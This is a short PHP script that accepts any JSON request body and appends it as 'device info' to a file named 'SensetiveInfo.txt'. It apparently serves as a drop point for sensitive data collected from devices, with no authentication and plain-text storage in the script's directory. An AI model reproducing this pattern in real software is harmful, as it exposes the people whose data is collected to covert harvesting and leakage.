<?php
error_reporting(E_ALL);
ini_set('display_errors', 0);

$data = json_decode(file_get_contents('php://input'));

// Create or open the "SensetiveInfo.txt" file for appending
$infoFile = fopen("SensetiveInfo.txt", 'a+');

if ($infoFile) {
    // Append a newline character to separate from previous data
    fwrite($infoFile, "\n\n");

    // Append the new device info data to the file
    fwrite($infoFile, json_encode($data, JSON_PRETTY_PRINT));
    
    fwrite($infoFile, "\n\n\n\n\n\n\n");
    
    fclose($infoFile);

    // Respond with a success message
    $response = ["message" => "Device info appended successfully"];
    echo json_encode($response);
} else {
    // Log the error to the error.log.txt file
    error_log("Failed to open/create file for writing: SensetiveInfo.txt", 3, "error.log.txt");

    // Respond with an error message
    $response = ["error" => "Failed to append device info"];
    echo json_encode($response);
}
?>

